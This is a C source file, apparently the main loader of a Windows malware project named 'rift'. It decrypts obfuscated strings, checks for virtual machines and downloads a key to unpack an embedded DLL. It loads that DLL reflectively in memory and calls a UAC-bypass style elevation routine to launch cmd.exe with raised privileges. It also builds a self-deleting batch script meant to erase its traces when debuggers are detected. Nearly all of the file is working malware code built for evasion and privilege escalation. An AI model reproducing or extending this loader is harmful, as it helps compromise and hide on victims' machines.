#include "_rift.h"

typedef BOOL(*pEDllInit)(_In_ PPIB);
typedef NTSTATUS(*ucmDebugObjectMethod)(_In_ PWSTR pszPayload);
VOID IGenerateHardwareId(
	_Out_ PUUID pHwId
);

INT WINAPI wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     PWSTR     pCmdLine,
	_In_     INT       nCmdShow
) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	{	// Initialize Process Information Block
		g_PIB->hMH = hInstance;
		GetCurrentDirectoryW(MAX_PATH, g_PIB->szCD);
		EXoshiroBegin(NULL);
		IGenerateHardwareId(&g_PIB->sID.HW);
		IGenerateSessionId(&g_PIB->sID.SE);
	}

	// Create Random Mutex using SId
	SIZE_T nResult;
	PCWSTR szLocal = DecryptString("/xxatZo5JyvmRnM3Z2HM4g==", &nResult); // L"Local\\"
	PWSTR szMutex = AllocMemory(MAX_PATH * sizeof(WCHAR));
	StringCchCopyW(szMutex, MAX_PATH, szLocal);
	FreeMemory(szLocal);
	PVOID pHWID = AllocMemory(MD5_SIZE);
	CopyMemory(pHWID, &g_PIB->sID.SE, MD5_SIZE);
	PCWSTR szRandom = EAllocRandomBase64StringW(pHWID, MAX_PATH / 2, MAX_PATH);
	FreeMemory(pHWID);
	StringCchCatW(szMutex, MAX_PATH, szRandom);
	FreeMemory(szRandom);

	// CreateMutexW(0, FALSE, szMutex);

	// init con
	IOpenConsole();
	BOOL bVM = ICheckVmPresent();

	PVOID pWKey = IDownloadKey();
	if (!pWKey) {
		PWSTR szKeyBlob = (PWSTR)AllocMemory(MAX_PATH);
		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->szCD, L"RIFTWKEY"); // Temporery
		DWORD nKeyBlob;
		pWKey = AllocReadFileW(szKeyBlob, &nKeyBlob);
	} if (pWKey)
		ECryptBegin(pWKey, &g_PIB->sCIB.WK);
	else
		return 0x45e0;

	SIZE_T nDll;
	PVOID pDll = EUnpackResource(&g_PIB->sCIB.WK, IDR_RIFTDLL, &nDll);
	if (!pDll)
		return 0x132d;

#ifndef _DEBUG
	// "Reflective" DLL loading will only be used in the release build
	HMEMORYMODULE hDll = MemoryLoadLibrary(pDll, nDll);
	if (!hDll)
		return 0x276f;

	pEDllInit EDllInit = (pEDllInit)MemoryGetProcAddress(hDll, "EDllInit");
	int a = EDllInit(10);

	MemoryFreeLibrary(hDll);
#else
	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", NULL, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
	if (!dhDll)
		return 0x2ab5;

	pEDllInit EDllInit = (pEDllInit)GetProcAddress(dhDll, "EDllInit");
	BOOL bTest = EDllInit(g_PIB);

	ucmDebugObjectMethod Elevate = (ucmDebugObjectMethod)GetProcAddress(dhDll, "ucmDebugObjectMethod");
	WCHAR payload[] = L"C:\\WINDOWS\\system32\\cmd.exe";
	Elevate(payload);

	FreeLibrary(dhDll);
#endif
	SecureZeroMemory(pDll, nDll);
	FreeMemory(pDll);

	{	// CleanUp
		EXoshiroEnd(NULL);
		HeapFree(g_PIB->hPH, NULL, g_PIB);
	} return 0;
}

/*	This function basically does what it's called,
	it "cleans" (or better purges) everything it can and tries to destroy
	all traces of it self (the loader and everything else it extracts).
	It should get triggered (/called) if any fatal error occurs,
	or the loader catches any suspicious activities (e.g. debuggers).  */
CONST STATIC WCHAR l_szSelfDelBat[] = {
	L"@echo off\n"
	L"%x:\n"
	L"\tdel \"%s\" /f\n"
	L"\tif exist \"%s\" (\n"
	L"\t\tgoto %x\n"
	L"\t)\n"
	L"del \"%s\" /f"
};
VOID ESelfDestruct() {
	// Prepare String for Filename of Batchfile
	PWSTR szFilePath = (PWSTR)AllocMemory(MAX_PATH * sizeof(WCHAR));
	PCWSTR szRandom = EAllocRandomPathW(NULL, 8, 16);
	CopyMemory(szFilePath, g_PIB->szCD, MAX_PATH * sizeof(WCHAR));
	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");

	// Prepare Script content
	PVOID pScriptW = AllocMemory(0x800);
	UINT uiRandomID = EXoshiroSS(NULL);
	PCWSTR szMFN = GetFileNameFromPathW(g_PIB->szMFN);
	StringCchPrintfW(pScriptW, 0x400, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, GetFileNameFromPathW(szFilePath));

	// Convert to Raw (ANSI)
	SIZE_T nScript;
	StringCchLengthW(pScriptW, 0x400, &nScript);
	PSTR pScriptA = AllocMemory(0x400);
	WideCharToMultiByte(CP_ACP, NULL, pScriptW, -1, pScriptA, 0x400, NULL, NULL);
	FreeMemory(pScriptW);

	// Write to Disk
	WriteFileCW(szFilePath, pScriptA, nScript);
	FreeMemory(pScriptA);
}